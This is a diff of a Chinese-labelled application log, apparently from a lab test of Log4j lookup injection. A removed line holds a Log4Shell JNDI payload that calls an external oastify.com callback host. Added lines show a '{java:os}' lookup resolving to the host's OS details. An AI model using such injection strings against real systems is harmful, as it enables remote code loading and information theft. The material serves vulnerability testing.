@@ -1,72 +1,24 @@
 =========================================
  日志级别：INFO
- 日志时间：2022-08-12 17:03:18,810
+ 日志时间：2022-08-25 10:21:38,173
  所属类名：java.util.function.LongFunction
  所属线程：main
- 日志信息：User [foo=1] login in!
+ 日志信息：User Drunkbaby login in!
 =========================================
  日志级别：INFO
- 日志时间：2022-08-12 17:11:57,652
+ 日志时间：2022-08-25 10:22:34,683
  所属类名：java.util.function.LongFunction
  所属线程：main
- 日志信息：User [foo=1] login in!
+ 日志信息：User {java:os} login in!
 =========================================
  日志级别：INFO
- 日志时间：2022-08-12 17:17:16,605
+ 日志时间：2022-08-25 10:23:16,977
  所属类名：java.util.function.LongFunction
  所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：INFO
- 日志时间：2022-08-12 17:19:18,484
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：INFO
- 日志时间：2022-08-12 18:40:06,147
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：INFO
- 日志时间：2022-08-12 18:47:45,261
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User ${jndi:ldap://mc2b0ll0v5a48aqrj0ikzx1yapgf44.oastify.com} login in!
-=========================================
- 日志级别：INFO
- 日志时间：2022-08-13 10:56:40,276
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
+ 日志信息：User Windows 10 10.0, architecture: amd64-64 login in!
 =========================================
  日志级别：ERROR
- 日志时间：2022-08-13 11:06:28,400
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：ERROR
- 日志时间：2022-08-13 11:07:08,777
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：ERROR
- 日志时间：2022-08-13 11:23:22,023
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：ERROR
- 日志时间：2022-08-13 11:27:48,901
- 所属类名：java.util.function.LongFunction
- 所属线程：main
- 日志信息：User [foo=1] login in!
-=========================================
- 日志级别：ERROR
- 日志时间：2022-08-13 12:47:34,214
+ 日志时间：2022-08-25 10:25:46,530
  所属类名：java.util.function.LongFunction
  所属线程：main
  日志信息：User [foo=1] login in!
